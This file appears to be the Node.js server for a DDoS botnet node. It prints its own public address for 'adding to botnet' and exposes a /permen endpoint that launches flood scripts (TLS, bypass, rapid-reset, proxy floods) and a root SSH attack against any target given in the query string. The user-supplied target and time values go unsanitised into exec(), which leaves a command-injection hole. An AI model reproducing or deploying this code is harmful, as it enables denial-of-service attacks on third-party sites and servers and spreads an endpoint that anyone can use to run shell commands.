const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

if (methods === 'kill') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXKill.js ${target} ${time} 100 10`);
} else if (methods === 'strike') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXStrike.js GET ${target} ${time} 10 90 proxy.txt --full`);
} else if (methods === 'bypass') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXBypass.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'tls') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXTls.js ${target} ${time} 100 10`);
} else if (methods === 'ninja') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXNinja.js ${target} ${time}`);
} else if (methods === 'mix') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXMix.js ${target} ${time} 100 10 proxy.txt`);
} else if (methods === 'raw') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRaw.js ${target} ${time}`);
} else if (methods === 'rapid-reset') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${target}`);
} else if (methods === 'pidoras') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXPidoras.js ${target} ${time} 80 10 proxy.txt`)
} else if (methods === 'http-x') {
	console.log(`recieved`)
    exec(`node ./lib/cache/HTTP-X.js ${target} ${time} 80 10 proxy.txt`)
} else if (methods === 'ssh') {
	console.log(`recieved`)
    exec(`node ./lib/cache/StarsXSsh.js ${slurp} 22 root ${time}`);
} else if (methods === 'proxy') {
	console.log(`recieved`)
    exec(`node ./lib/cache/scrape.js`);
} else {}
});
app.listen(port, () => {
fetchData()
});
